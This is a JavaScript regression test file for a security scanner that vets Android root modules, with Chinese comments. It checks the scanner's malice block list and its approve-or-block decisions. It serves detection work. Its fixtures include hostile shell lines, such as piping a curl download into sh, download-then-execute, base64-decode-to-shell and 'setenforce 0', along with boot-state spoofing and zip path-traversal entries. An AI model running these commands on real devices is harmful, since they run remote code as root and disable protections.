// 两轴分流的判据层常驻回归（设计文档 §2 / §3.2 / §4 / §13.5 / §13.6）。
//
// 这里钉的是「换轴」这件事本身，不是任何一条行级正则：
//   轴心 = 恶意定性（§3.2 定案那张表，11 条）∪ AI 恶意结论（§6）；等级退成标注输入。
//   取严（§0.1）：任一命中就不上架；两边都只有拒的权力，永远没有放的权力。
//
// 断言口径与 detection-regression.test.mjs 同一条纪律：
//   * 每个名单成员都要有一枚**会咬人**的证人 —— 不只是「它能命中」，还要
//     「摘掉它之后这一发的判定就变了」（mutation: MALICE_EXCLUSIVE 那一列）；
//   * 降档的每一条要有**反例**：同一形状在新模型下要么仍被别的成员挡住，要么必须出现在
//     标注（annotation）里点名 —— 「降档后静默」是 §3.2 ② 那族唯一的验收形状。
//
// ⚠ 2026-10-21 第二发：调用点已换轴。scan.mjs 的 decide() 现在传第四参（classifyMalice(all, null)），
//   所以整包 report.decision 就站在新轴上；本文件里既有用例直接调 decide()（钉判据本身），
//   也有端到端那几发钉「报告里的判决 == 判据算出来的判决」（第 7 节）。
//   AI 那一支在 scan 里恒为 null —— 恶意通道的 ∪ 发生在 audit.yml「分流决策」那一步。
//
// 运行：node --test audit/malice-axis.test.mjs
import test from 'node:test';
import assert from 'node:assert/strict';

import {
  RULES_BY_ID, scanContent, inspectStructure,
  MALICE_LIST, MALICE_RULE_IDS, MALICE_DEFERRED,
  CONTEXT_QUESTION_RULE_IDS, CAPABILITY_RULE_IDS, COVERAGE_RULE_IDS,
  classifyMalice, summarizeCoverage, decide,
} from './risk-rules.mjs';
import { aiMalice } from './ai-review.mjs';
import { makeModuleZip, scanToReport } from './fixtures.mjs';

const SHE = '#!/system/bin/sh';
const body = (...lines) => [SHE, ...lines].join('\n') + '\n';

/** 行级探针：这段文本在扫描器里到底说出哪些 ruleId（档位照实带着）。 */
const lineHits = (file, text) => scanContent(file, text).filter((f) => f.severity != null);
const idsOf = (list) => [...new Set(list.map((f) => f.ruleId))].sort();
/** 一份发现清单里，属于拦截名单的那几个名字。 */
const maliceIdsOf = (list) => classifyMalice(list).hits
  .filter((h) => h.source === 'static').map((h) => h.ruleId).sort();

/* ---------------------------------------------------------------------------
 * 1. 名单的形状钉子：11 条定案、11 条 armed、0 条 deferred
 *    （§13.5 那一格已闭环：WRITE_SYSTEM_VENDOR 的锚点判据改成按匹配自身的分串位置判之后才进 armed，
 *     独占证人在下面那张 MALICE_SHAPES 里，变异证人在 scan.test.mjs。）
 *    这张表就是 §13.5 那句「按 §3.2 末尾那张表定案（11 条）」在代码里的唯一副本。
 *    加了成员、删了成员、把某条偷偷 armed 掉，都必须红在这里。
 * ------------------------------------------------------------------------ */

const AGREED_11 = [
  'PIPE_TO_SHELL', 'DOWNLOAD_THEN_EXEC', 'DOWNLOAD_TO_MODULE_EXEC', 'OBFUSCATED_DECODE_EXEC',
  'SELINUX_DISABLE', 'EXEC_INDIRECT', 'WRITE_SYSTEM_VENDOR',
  'STRUCT_SYMLINK', 'STRUCT_UNSAFE_PATH', 'STRUCT_DUPLICATE_NAME', 'STRUCT_ZIP_BOMB',
];

test('名单定案表：11 条逐字对齐 §3.2 末尾那张表，一条不多一条不少', () => {
  assert.deepEqual([...MALICE_LIST].map((m) => m.id).sort(), [...AGREED_11].sort(),
    '拦截名单的成员表漂了：§13.5 拍的是这张表，改它要重新过一轮定案，不许顺手');
  assert.equal(MALICE_LIST.length, 11);
  for (const m of MALICE_LIST) {
    assert.ok(typeof m.note === 'string' && m.note.length > 8, `${m.id} 少了「这条为什么在名单里」那句话`);
    assert.equal(typeof m.armed, 'boolean', `${m.id} 的 armed 必须是显式布尔，缺席不许当 false 也不许当 true`);
    if (!m.armed) assert.ok(typeof m.closesWhen === 'string' && m.closesWhen.length > 8,
      `${m.id} 不 armed 却没写 closesWhen —— 那就是永久静默`);
  }
});

test('名单里每条 armed 的规则都真的存在于扫描器某一层的产出里（不写不存在的名字）', () => {
  // 行级那几条住在 RULES_BY_ID；STRUCT_* 那四条是非行级那一族（§3.2 ③：住在 push('ID','档位') 里）。
  // 第一轮那份「14 条 high」底账就是这么作废的：只扫 severity 字面会漏掉整个 STRUCT_* 家族。
  const lineLevel = new Set(Object.keys(RULES_BY_ID));
  const structureLevel = new Set(inspectStructure([
    { name: '../escape.sh', method: 8, compSize: 10, origSize: 20 },
    { name: 'a.sh', method: 8, compSize: 10, origSize: 20 },
    { name: 'a.sh', method: 8, compSize: 10, origSize: 20 },
    { name: 'l.link', method: 8, compSize: 10, origSize: 20, isSymlink: true },
    { name: 'z', method: 8, compSize: 1000, origSize: 600 * 1024 * 1024 },
  ]).findings.map((f) => f.ruleId));
  const producible = new Set([...lineLevel, ...structureLevel]);
  for (const id of MALICE_RULE_IDS) {
    assert.ok(producible.has(id), `${id} 在名单里，但扫描器这一层的探针产不出它 —— 名单里写了一个不存在的名字`);
  }
});

test('armed 与 deferred 的划分：11 条全 armed，deferred 必须是空表', () => {
  assert.deepEqual(MALICE_DEFERRED.map((m) => m.id), [],
    'deferred 里冒出任何东西都要红：那意味着名单里塞了一条没有独占证人的成员（§13.5 拍的是先修判据再进名单）');
  assert.equal(MALICE_RULE_IDS.length, 11);
  assert.ok(MALICE_RULE_IDS.includes('WRITE_SYSTEM_VENDOR'),
    '它 armed 的前提是 overlayOnlyMatch 在本副本里（risk-rules.mjs）；锚点修法被回退就得把它退回 deferred');
});

/* ---------------------------------------------------------------------------
 * 2. 每个名单成员一枚会咬人的证人
 *    expect = 这一发在扫描器里说出的全部 ruleId（写全，兄弟规则一并显形）
 *    sole   = 摘掉本成员之后判定是否真的翻（true ⇒ 它是这一发的唯一证人）
 * ------------------------------------------------------------------------ */

const MALICE_SHAPES = [
  {
    id: 'PIPE_TO_SHELL',
    // 网络上的字节直接交给解释器：用户不可能同意这件事（§3 左列第一条）
    file: 'service.sh', text: body('curl -s https://a.cc/x.sh | sh'),
    sole: true,
    note: '同发还带 SUSPICIOUS_DOMAIN / NETWORK_FETCH，但它们不在名单里 ⇒ 摘掉本条就没人拦',
  },
  {
    id: 'DOWNLOAD_THEN_EXEC',
    file: 'service.sh',
    text: body('curl -o /data/local/tmp/x https://a.cc/bin', 'chmod 755 /data/local/tmp/x', '/data/local/tmp/x'),
    sole: true,
    note: '载荷不在包内：审核面永远读不到最终执行的那份字节',
  },
  {
    id: 'OBFUSCATED_DECODE_EXEC',
    file: 'service.sh', text: body('echo ZWNobyBwaW5nIHwgc2h8c2g= | base64 -d | sh'),
    sole: true,
    note: '编码的目的就是让审核面读不到载荷 —— 这一发只有它说话',
  },
  {
    id: 'SELINUX_DISABLE',
    file: 'service.sh', text: body('setenforce 0'),
    sole: true,
    note: '§3 那条边界（与 MAGISK_POLICY_LIVE 是近亲）实测取「留在名单里」：整包只有这一行时它是唯一证人',
  },
  {
    id: 'EXEC_INDIRECT',
    file: 'service.sh', text: body('sh "$ZIP_PATH.tmp"'),
    sole: true,
    note: '§3.2 ①：它的射程是「说不清执行的是谁」那一档。KM-1/KM-4 两发由它顶住，不是装饰',
  },
  {
    id: 'WRITE_SYSTEM_VENDOR',
    // 这一发刻意选「源在覆盖层、目标在真分区」那形：旧 exclude（整行判豁免）在它上面 0 命中，
    // 也就是 `$MODPATH` 这七个字符就能把一条 high 缴械。锚点判据移植进来（overlayOnlyMatch）
    // 之后它才第一次有资格进 armed 名单 —— 所以这一发同时是那条修法的独占证人。
    file: 'service.sh', text: body('cp "$MODPATH/engines.bin" /system/app/Foo/engines.bin'),
    sole: true,
    note: '§13.5 闭环：先修锚点判据、再进名单。变异证人两枚在 scan.test.mjs（那 8 个形状 + ANCHOR_WITNESS 的载荷），把 exclude 改回整行判它们当场红',
  },
];

for (const s of MALICE_SHAPES) {
  test(`名单成员 ${s.id}：整包形状命中并 block（含「摘掉它就翻」的那一半）`, async () => {
    assert.ok(MALICE_RULE_IDS.includes(s.id), `${s.id} 不在 armed 名单里，证人却还在跑 —— 名单被偷偷改了`);
    const zip = makeModuleZip({ id: `malice.${s.id.toLowerCase()}`, files: [[s.file, s.text]] });
    const rep = await scanToReport(zip, { changeType: 'first' });

    assert.ok(rep.findings.some((f) => f.ruleId === s.id),
      `${s.id} 没在这枚夹具里说话（实际：${idsOf(rep.findings).join(',')||'0 命中'}）`);
    const mal = classifyMalice(rep.findings, null);
    assert.equal(mal.malicious, true, s.note);
    assert.ok(mal.hits.some((h) => h.ruleId === s.id && h.source === 'static'));
    assert.deepEqual(mal.basis, ['static-malice-list']);
    const d = decide(rep.riskLevel, 'first', { revokedCount: 0 }, mal);
    assert.equal(d.action, 'block', `${s.id} 命中却不拦 = 名单失去意义`);
    // 契约 §1.1：block 的 label 是 auto-rejected、needsHumanReview 为 false —— 去人工化之后
    // 没有「转人工」这个去处，命中名单就是自动拒，不再挂 needs-human-review 等人来签。
    assert.equal(d.label, 'auto-rejected', '§1.1 的 block 返回形状：label 必须是 auto-rejected');
    assert.equal(d.needsHumanReview, false, '§1.1：block 也不再是「等人审」，机器自己拒');
    assert.equal(d.axis, 'malice');

    if (s.sole) {
      // 变异证人：把这一条从判据里摘掉（用输入摘，不改代码），整发的判定必须翻。
      const minus = rep.findings.filter((f) => f.ruleId !== s.id);
      assert.equal(classifyMalice(minus, null).malicious, false,
        `${s.id} 摘掉后仍然 malicious ⇒ 有兄弟规则顶着，这枚夹具不是它的独占证人（V3 那个病）`);
      assert.equal(decide(rep.riskLevel, 'first', { revokedCount: 0 }, classifyMalice(minus, null)).action,
        'auto-approve', '摘掉唯一证人之后这一发应当变成上架 —— 否则说明等级还在拦');
    }
  });
}

const STRUCT_SHAPES = [
  { id: 'STRUCT_SYMLINK', entries: [{ name: 'l.link', method: 8, compSize: 10, origSize: 20, isSymlink: true }] },
  { id: 'STRUCT_UNSAFE_PATH', entries: [{ name: '../escape.sh', method: 8, compSize: 10, origSize: 20 }] },
  { id: 'STRUCT_DUPLICATE_NAME', entries: [
    { name: 'a.sh', method: 8, compSize: 10, origSize: 20 },
    { name: 'a.sh', method: 8, compSize: 10, origSize: 20 }] },
  { id: 'STRUCT_ZIP_BOMB', entries: [{ name: 'z', method: 8, compSize: 1000, origSize: 600 * 1024 * 1024 }] },
];

for (const s of STRUCT_SHAPES) {
  test(`名单成员 ${s.id}（非行级那一族）：结构层命中并 block，且它是自己那一发的唯一证人`, () => {
    assert.ok(MALICE_RULE_IDS.includes(s.id), `${s.id} 不在 armed 名单里`);
    const findings = inspectStructure(s.entries).findings;
    assert.ok(findings.some((f) => f.ruleId === s.id),
      `${s.id} 没在这组条目上说话（实际 ${idsOf(findings).join(',') || '0 命中'}）`);
    const mal = classifyMalice(findings, null);
    assert.equal(mal.malicious, true, s.id);
    assert.equal(decide('high', 'first', { revokedCount: 0 }, mal).action, 'block');
    // §3.2 ③：这四种没有正当用法（安装以 root 运行）⇒ 进恶意轴，不进上下文题那一族
    assert.ok(!CONTEXT_QUESTION_RULE_IDS.includes(s.id));
    const minus = findings.filter((f) => f.ruleId !== s.id);
    assert.equal(classifyMalice(minus, null).malicious, false,
      `${s.id} 被兄弟顶住了 ⇒ 这枚不是独占证人，不许当它是`);
  });
}

/* ---------------------------------------------------------------------------
 * 3. 两条「名单里有、但我不替它作证」的诚实账
 * ------------------------------------------------------------------------ */

test('DOWNLOAD_TO_MODULE_EXEC：armed，但它的形状今天由 DOWNLOAD_THEN_EXEC 顶住（§3.2 ① / §13.7）', () => {
  assert.ok(MALICE_RULE_IDS.includes('DOWNLOAD_TO_MODULE_EXEC'), '它在定案表里，本轮不降它');
  const hits = lineHits('service.sh', body(
    'curl -o "$MODPATH/tool" https://a.cc/tool', 'chmod 755 "$MODPATH/tool"', '"$MODPATH/tool"'));
  // 实测读数（2026-10-21，与 §3.2 那张表同一发）：这一发落到了 DOWNLOAD_THEN_EXEC 那一格。
  assert.ok(idsOf(hits).includes('DOWNLOAD_THEN_EXEC'), '兄弟规则没顶住 ⇒ 下面那条「不替它作证」的前提变了，重新量');
  assert.ok(!idsOf(hits).includes('DOWNLOAD_TO_MODULE_EXEC'),
    '它今天自己会说话了 ⇒ §3.2 ① 那句「独立读数仍未量到」作废，这一发要升成独占证人');
  // 摘掉它不改判定（所以它在名单里目前不增加拦截力，也不减少）：这条就是 §13.7 留着的那格。
  assert.equal(classifyMalice(hits, null).malicious, true);
});

// 这里原来那一发「WRITE_SYSTEM_VENDOR 的缴械证人」已按它自己留下的收场指令删除：
// 锚点判据（overlayOnlyMatch）移植进本副本之后，那一发的第一句断言必然红，而它写的是
// 「那时该做的是把 armed 翻成 true、补一枚独占证人，然后删掉这条用例，不许反过来把断言改成两种写法都 0 命中」。
// 独占证人现在住在上面那张 MALICE_SHAPES 里；变异证人两枚在 scan.test.mjs（8 个形状 + ANCHOR_WITNESS 载荷）。

/* ---------------------------------------------------------------------------
 * 4. 降档那一批：不再拦上架，但必须出现在标注里（§0.2 + §13.6）
 * ------------------------------------------------------------------------ */

const DOWNGRADED = [
  { id: 'PROP_BOOT_SPOOF', file: 'system.prop', text: 'ro.boot.verifiedbootstate=green\nro.boot.flash.locked=0\n' },
  { id: 'VERIFIED_BOOT_SPOOF', file: 'service.sh', text: body('resetprop -w ro.boot.verifiedbootstate green') },
  { id: 'MAGISK_POLICY_LIVE', file: 'service.sh', text: body('magiskpolicy --live "allow kernel su"') },
  { id: 'SELINUX_TYPE_PERMISSIVE', file: 'sepolicy.rule', text: 'allow su * *:* { execute }\npermissive su\n' },
  { id: 'EXEC_BUNDLED_FILE', file: 'service.sh', text: body('sh /data/adb/modules/malice.down/file.json') },
  { id: 'MODDIR_RUNTIME_WRITE', file: 'service.sh', text: body('unzip -o "$MODPATH/z.zip" -d "$MODDIR"') },
];

test('同形那一族与纯能力那一族：降档后不拦上架，但一律在 annotation 里点名（不许静默）', () => {
  assert.deepEqual([...CONTEXT_QUESTION_RULE_IDS].sort(),
    ['MAGISK_POLICY_LIVE', 'PROP_BOOT_SPOOF', 'SELINUX_POLICY_RELAX', 'SELINUX_TYPE_PERMISSIVE', 'VERIFIED_BOOT_SPOOF'],
    '§13.6 拍的上下文题成员是这 5 条（第一轮那张表漏了两条）');
  for (const s of DOWNGRADED) {
    const hits = lineHits(s.file, s.text);
    assert.ok(hits.some((f) => f.ruleId === s.id), `${s.id} 没在自己的降档证人里说话：${idsOf(hits).join(',') || '0 命中'}`);
    const mal = classifyMalice(hits, null);
    assert.equal(mal.malicious, false, `${s.id} 还在拦上架 —— 它就是 §1 第 3 条那批「正当功能本身」`);
    assert.ok(hits.every((f) => f.severity === 'high' || f.severity === 'medium'), `${s.id} 的档位读数变了`);
    const d = decide('high', 'first', { revokedCount: 0 }, mal);
    assert.equal(d.action, 'auto-approve', `${s.id}：等级 high 但名单外 ⇒ 上架 + 标注`);
    assert.match(d.reason, /只是标注输入，不再拦上架/);

    const ann = summarizeCoverage(hits, { level: 'high' });
    if (CONTEXT_QUESTION_RULE_IDS.includes(s.id)) {
      assert.ok(ann.contextQuestions.includes(s.id),
        `${s.id} 降档了却没进上下文题清单 ⇒ §13.6 那半句「给 AI 一道上下文题」落空`);
    }
    assert.ok(ann.capabilities.includes(s.id), `${s.id} 从标注里消失了 ⇒ 读者再也看不见这个能力`);
    assert.equal(ann.humanReview.startsWith('none'), true);
  }
});

test('覆盖度那一组保持标注（§3.2 ③）：AUDIT_COVERAGE_* / STRUCT_ENCRYPTED 一类不获得拦截力', () => {
  const cov = inspectStructure([{ name: 's.bin', method: 8, compSize: 10, origSize: 20, encrypted: true }]).findings;
  assert.ok(cov.some((f) => f.ruleId === 'STRUCT_ENCRYPTED'));
  assert.equal(classifyMalice(cov, null).malicious, false,
    '「读不懂」不等于「恶意」：它是 §0.2 那句「上架但标注覆盖不全」，不是拒');
  const ann = summarizeCoverage(cov, { level: 'medium' });
  assert.deepEqual(ann.coverageGaps, ['STRUCT_ENCRYPTED']);
  for (const id of COVERAGE_RULE_IDS) assert.ok(!MALICE_RULE_IDS.includes(id), `${id} 不该获得拦截力`);
});

/* ---------------------------------------------------------------------------
 * 5. 取严与不变量（§0.1 / §2）
 * ------------------------------------------------------------------------ */

test('取严：静态名单 ∪ AI 恶意结论，任一命中就不上架；两边都只有拒的权力', () => {
  const clean = lineHits('service.sh', body('ui_print("installed")'));
  assert.equal(classifyMalice(clean, null).malicious, false);

  // (1) 静态命中 + AI 说不是 ⇒ 仍然 block（AI 没有放的权力）
  const staticHit = lineHits('service.sh', body('setenforce 0'));
  assert.equal(classifyMalice(staticHit, { malicious: false, verified: [] }).malicious, true,
    'AI 的「不是」把静态那一格洗掉了 ⇒ 它拿到了放行权，违反 §0.1');
  // (2) 静态干净 + AI 恶意且引用已逐字复验 ⇒ block（AI 新增的那一发拒的权力）
  const byAi = classifyMalice(clean, { malicious: true, verified: [{ file: 'service.sh', line: 2, quote: 'ui_print("installed")' }] });
  assert.equal(byAi.malicious, true);
  assert.deepEqual(byAi.basis, ['ai-malice-verified']);
  assert.equal(decide('low', 'first', { revokedCount: 0 }, byAi).action, 'block');
  // (3) AI 恶意但复验不过 ⇒ 不采信：不拦，但 basis 记下这一格（§6）
  const untrusted = classifyMalice(clean, { malicious: true, verified: [] });
  assert.equal(untrusted.malicious, false);
  assert.deepEqual(untrusted.basis, ['ai-malice-unverified-not-adopted']);
  // (4) 两边同时命中 ⇒ hits 里两支都在，判定仍是 block
  const both = classifyMalice(staticHit, { malicious: true, verified: [{ file: 'service.sh', line: 2, quote: 'setenforce 0' }] });
  assert.equal(both.malicious, true);
  assert.deepEqual([...both.basis].sort(), ['ai-malice-verified', 'static-malice-list']);
});

test('判据读不懂就是拒，不是跳（fail-closed 的方向只能是更严）', () => {
  for (const bad of [null, undefined, 'findings', {}, 42]) {
    const m = classifyMalice(bad, null);
    assert.equal(m.malicious, true, JSON.stringify(bad));
    assert.equal(decide('low', 'first', null, m).action, 'block', JSON.stringify(bad));
  }
  // 但「一条都没命中」必须是明确的 false —— 否则整个名单形同虚设
  assert.equal(classifyMalice([], null).malicious, false);
});

test('AI 通道的形状能直接喂进 classifyMalice（v2 复验过 / 复验不过 / v1 三代各一发）', () => {
  const quote = 'curl -s https://a.cc/x.sh | sh';
  const corpus = new Map([['service.sh', [`1| ${SHE}`, `2| ${quote}`]]]);
  const v2 = { schemaVersion: 2, agree: false, risk: 'high', findings: [],
    malicious: true, malice_evidence: [{ file: 'service.sh', line: 2, quote }] };
  const a1 = aiMalice(v2, corpus);
  assert.equal(a1.malicious, true);
  assert.equal(a1.verified.length, 1);
  assert.equal(classifyMalice(lineHits('service.sh', body('ui_print("x")')), a1).malicious, true,
    '静态干净的一发要被 AI 的恶意结论拦下来');

  // 引用是编的：不在 corpus 那一行里 ⇒ 不采信，也不许拦
  const fabricated = { ...v2, malice_evidence: [{ file: 'service.sh', line: 2, quote: 'curl -s https://a.cc/EVIL.sh | sh' }] };
  const a2 = aiMalice(fabricated, corpus);
  assert.equal(a2.malicious, false, '编造证据的 AI 结论拿到了拒的权力 —— §0.3 那条「逐字定位到」的门槛就是这一格');
  assert.equal(a2.basis, 'ai-malice-unverified-not-adopted');
  assert.equal(classifyMalice([], a2).malicious, false);

  // v1：那一代没有恶意这一格 ⇒ 永远给不出拒的权力（沉默不许被读成任何一种表态）
  const a3 = aiMalice({ schemaVersion: 1, agree: false, risk: 'high', findings: [] }, corpus);
  assert.equal(a3.malicious, false);
  assert.equal(a3.basis, 'schema-v1-no-malice-slot');
  // file 不在 corpus 里同样不采信（§6 已知限制那一格：二进制的 line 只能是 1，file 必须 ∈ corpus 键）
  const a4 = aiMalice({ ...v2, malice_evidence: [{ file: 'no-such-entry.sh', line: 2, quote }] }, corpus);
  assert.equal(a4.malicious, false);
});

/* ---------------------------------------------------------------------------
 * 6. 老轴不许被这一发改掉（pin 约束的另一半）
 * ------------------------------------------------------------------------ */

test('老轴逐字保留：不传第四参就是今天的等级判据（YAML 接线之前，报告与 required check 说同一句话）', () => {
  assert.equal(decide('low', 'first').action, 'auto-approve');
  assert.equal(decide('low', 'update').action, 'request-review');
  assert.equal(decide('low', 'unknown').action, 'request-review');
  for (const lv of ['medium', 'high']) assert.equal(decide(lv, 'first').action, 'block', lv);
  assert.equal(decide('low', 'first', null, undefined).action, 'auto-approve');
  assert.equal(decide('low', 'first', null, null).action, 'auto-approve', '显式 null 也算「没接到判据」⇒ 老轴');
  // 读不懂等级那一格照旧保守：新轴下它仍然拦
  assert.equal(classifyMalice(null, null).malicious, true);
  // 老轴的形状也要逐字不动（契约 §1.2）：request-review / needs-human-review / needsHumanReview:true
  // 这三件事都还在这条分支上活着。新轴把 request-review 删干净了，但**没有**连带删老轴 ——
  // 有人「顺手统一一下」把老轴也二值化，就会红在这里。
  assert.deepEqual(decide('low', 'update'), {
    action: 'request-review', label: 'needs-human-review', needsHumanReview: true,
    reason: '静态扫描 low 风险，但这是对已收录模块的版本更新，按规则一律人工审',
  });
});

/* ---------------------------------------------------------------------------
 * 5.5 契约 §1.1 四支逐支钉死（去人工化那一轮的验收形状）
 * ------------------------------------------------------------------------ */

test('§1.1 四支：① 命中名单 / ② 含 unknown / ③ 撤销过 / ④ 其余一切', () => {
  const clean = classifyMalice(lineHits('service.sh', body('ui_print("x")')), null);
  const evil = classifyMalice(lineHits('service.sh', body('curl -s https://a.cc/x.sh | sh')), null);
  assert.equal(clean.malicious, false);
  assert.equal(evil.malicious, true);

  // ① 命中名单 ⇒ block（level 说什么都不影响）
  for (const lv of ['low', 'medium', 'high']) {
    const d = decide(lv, 'first', null, evil);
    assert.equal(d.action, 'block', `① ${lv}/first 命中名单必须 block`);
    assert.equal(d.label, 'auto-rejected');
    assert.equal(d.needsHumanReview, false);
    assert.equal(d.axis, 'malice');
    assert.deepEqual([...d.basis], ['static-malice-list']);
  }

  // ② 含 unknown ⇒ block（fail-closed）
  const d2 = decide('low', 'unknown', null, clean);
  assert.equal(d2.action, 'block');
  assert.equal(d2.label, 'auto-rejected');
  assert.match(d2.reason, /按不可上架处理/);

  // ③ 撤销过 ⇒ block
  const d3 = decide('low', 'first', { revokedCount: 1, revokedEntries: ['x.sh'] }, clean);
  assert.equal(d3.action, 'block');
  assert.equal(d3.label, 'auto-rejected');
  assert.match(d3.reason, /x\.sh/, 'reason 必须指名被撤销的条目，人才复验得了');

  // ④ 其余一切 ⇒ auto-approve。level 三档 × changeType 两档全枚举，一支不许漏。
  for (const lv of ['low', 'medium', 'high']) {
    for (const ct of ['first', 'update']) {
      const d4 = decide(lv, ct, { revokedCount: 0 }, clean);
      assert.equal(d4.action, 'auto-approve', `④ ${lv}/${ct} 名单外必须放行`);
      assert.equal(d4.label, 'auto-approved');
      assert.equal(d4.needsHumanReview, false);
      assert.equal(d4.axis, 'malice');
      assert.match(d4.reason, /只是标注输入，不再拦上架/);
    }
  }
});

test('§1.1 ② 的拼接值：first+update 放行，first+unknown 拦（批量 PR 的 changeTypeOf 会产出这种值）', () => {
  const clean = classifyMalice(lineHits('service.sh', body('ui_print("x")')), null);
  // 批量 PR 里一包首投一包更新 ⇒ 'first+update'。它不含 unknown ⇒ 走 ④ 放行。
  // 这里钉的是「split('+') 再 includes」这个写法本身：若有人图省事写成
  // `changeType !== 'first'` 或 `String(changeType).includes('unknown')`，
  // 前者会把 first+update 误拦，后者看着一样但挡不住 'notunknown' 这种脏值。
  const mix = decide('low', 'first+update', null, clean);
  assert.equal(mix.action, 'auto-approve', 'first+update 不含 unknown ⇒ 必须放行');
  // 拼接值里带 unknown ⇒ 真的分不清 ⇒ 拦。
  const mixed = decide('low', 'first+unknown', null, clean);
  assert.equal(mixed.action, 'block', 'first+unknown 含 unknown ⇒ 必须拦');
  assert.equal(mixed.label, 'auto-rejected');
  // 脏值：不是以 + 分隔的整词，不该被当成 unknown。
  assert.equal(decide('low', 'notunknown', null, clean).action, 'auto-approve',
    '判据是「split(+) 后含 unknown 这个词」，不是「字符串里含 unknown 子串」');
});

test('§1.1 取严：malice 命中时 changeType 说什么都不放行（first 与 update 一视同仁）', () => {
  const evil = classifyMalice(lineHits('service.sh', body('curl -s https://a.cc/x.sh | sh')), null);
  assert.equal(evil.malicious, true);
  for (const ct of ['first', 'update', 'unknown', 'first+update']) {
    const d = decide('low', ct, { revokedCount: 0 }, evil);
    assert.equal(d.action, 'block', `① 优先于 ②③④：${ct} 下命中名单仍然 block`);
    assert.equal(d.label, 'auto-rejected');
  }
});

test('§1.1 新轴只有两个 action：全枚举跑一遍，request-review 一个都不许冒出来', () => {
  const clean = classifyMalice(lineHits('service.sh', body('ui_print("x")')), null);
  const evil = classifyMalice(lineHits('service.sh', body('curl -s https://a.cc/x.sh | sh')), null);
  const seen = new Set();
  for (const lv of ['low', 'medium', 'high']) {
    for (const ct of ['first', 'update', 'unknown', 'first+update', 'first+unknown']) {
      for (const cov of [null, { revokedCount: 0 }, { revokedCount: 2, revokedEntries: ['a.sh'] }]) {
        for (const mal of [clean, evil]) {
          const d = decide(lv, ct, cov, mal);
          seen.add(d.action);
          assert.ok(d.action === 'block' || d.action === 'auto-approve',
            `新轴冒出了第三个 action：${d.action}（契约 §1.1 是二值）`);
          assert.equal(d.label, d.action === 'block' ? 'auto-rejected' : 'auto-approved');
          assert.equal(d.needsHumanReview, false, '新轴上 needsHumanReview 恒 false');
        }
      }
    }
  }
  assert.deepEqual([...seen].sort(), ['auto-approve', 'block']);
});

test('fix8-E 那道闸在新轴上仍然生效（只更严不更松）', () => {
  const clean = classifyMalice(lineHits('service.sh', body('ui_print("x")')), null);
  assert.equal(clean.malicious, false);
  const revoked = { revokedCount: 2, revokedEntries: ['a.sh', 'b.sh'] };
  const d = decide('high', 'first', revoked, clean);
  assert.equal(d.action, 'block', '撤销过 ⇒ 机器不替它作证，这一格在换轴后仍然拦自动放行');
  // 契约 §1.1：新轴只有 block / auto-approve 两值，block 的 label 一律 auto-rejected。
  assert.equal(d.label, 'auto-rejected');
  assert.equal(d.needsHumanReview, false);
  assert.match(d.reason, /机器不替它作证/);
  // 措辞纪律（任务 1 第 3 支）：改成「不予自动放行」，不再说「需人工确认」——
  // 去人工化后没有人工确认这个去处，那句话会指向一个不存在的动作。
  assert.match(d.reason, /不予自动放行/);
  assert.doesNotMatch(d.reason, /需人工确认/);
});

test('update / unknown 在新轴上的两支：update 放行、unknown 拦（§1.1 第 ② 支）', () => {
  const clean = classifyMalice(lineHits('service.sh', body('ui_print("x")')), null);
  // 契约 §1.1 要点：`update` 与 `first` 判据完全等价，不做跨版本差异比对（用户 Q12 口径）。
  const up = decide('low', 'update', null, clean);
  assert.equal(up.action, 'auto-approve', 'update 不再另开一道：与 first 同一套判据');
  assert.match(up.reason, /版本更新与首次收录适用同一套判据/,
    'update 的 reason 必须说出这句话 —— 旧文案「按规则需要人工审核」是假陈述');
  // 只有真的分不清首投/更新才 fail-closed。
  const unk = decide('low', 'unknown', null, clean);
  assert.equal(unk.action, 'block');
  assert.equal(unk.label, 'auto-rejected');
  assert.match(unk.reason, /无法判定是首次收录还是版本更新/);
});

/* ---------------------------------------------------------------------------
 * 7. 整包端到端：正经模块能上架，故意做坏的仍然红
 * ------------------------------------------------------------------------ */

test('端到端：正当功能那一族的真形状在新轴下能自动上架（§12 Phase 1 验收第一条）', async () => {
  const zip = makeModuleZip({ id: 'eval.twoaxis.faker', files: [
    ['service.sh', body(
      'resetprop -w ro.boot.verifiedbootstate green',
      'magiskpolicy --live "allow kernel su"',
      'unzip -o "$MODPATH/payload.zip" -d "$MODDIR"')],
    ['system.prop', 'ro.boot.verifiedbootstate=green\n'],
  ]});
  const rep = await scanToReport(zip, { changeType: 'first' });
  assert.equal(rep.riskLevel, 'high', '这族读数本身仍然是 high —— 换轴不改等级，只改「等级不再是判决」');
  assert.equal(rep.malice.malicious, false, JSON.stringify(rep.malice.hits));
  assert.ok(rep.malice.reason.startsWith('未命中上架拦截名单'), rep.malice.reason);
  assert.equal(rep.annotation.contextQuestions.length, 3,
    `上下文题应当点到 3 族，实际 ${JSON.stringify(rep.annotation.contextQuestions)}`);
  assert.ok(rep.annotation.capabilities.length >= 3);
  assert.equal(rep.annotation.humanReview.startsWith('none'), true);
  // 第二发已接线：整包 decision 现在就站在新轴上（scan.mjs 的 decide 调用点传了第四参）。
  assert.equal(rep.decision.axis, 'malice');
  assert.equal(rep.decision.action, 'auto-approve',
    '这一发是 §12 Phase 1 验收第一条的形状：high 但名单外 ⇒ 上架 + 标注。它今天必须绿，'
    + '红了就说明调用点被退回老轴（正当功能的 high 又在拦上架，整个换轴等于没做）');
  assert.match(rep.decision.reason, /只是标注输入，不再拦上架/);
  // 与直接喂 decide() 的读数一字相同（报告里的判决 == 判据算出来的判决，没有第二套）。
  assert.equal(decide(rep.riskLevel, rep.changeType, { revokedCount: 0 }, rep.malice).action,
    rep.decision.action);
});

test('端到端：命中名单的一发（下载→执行）在两种轴向下都红，且红的原因是名单不是等级', async () => {
  const zip = makeModuleZip({ id: 'eval.twoaxis.evil', files: [
    ['service.sh', body('curl -o /data/local/tmp/x https://a.cc/bin', 'chmod 755 /data/local/tmp/x', '/data/local/tmp/x')],
  ]});
  const rep = await scanToReport(zip, { changeType: 'first' });
  assert.equal(rep.malice.malicious, true);
  assert.deepEqual(maliceIdsOf(rep.findings), ['DOWNLOAD_THEN_EXEC']);
  assert.equal(rep.decision.action, 'block', '整包 decision：名单命中 ⇒ block（这一发的等级也是 high，所以下面那两条要分开证）');
  assert.equal(rep.decision.axis, 'malice');
  assert.deepEqual([...rep.decision.basis], ['static-malice-list'], '拦它的必须是名单，不是等级');
  assert.equal(decide(rep.riskLevel, rep.changeType, { revokedCount: 0 }, rep.malice).action, 'block', '新轴：名单命中 ⇒ block');
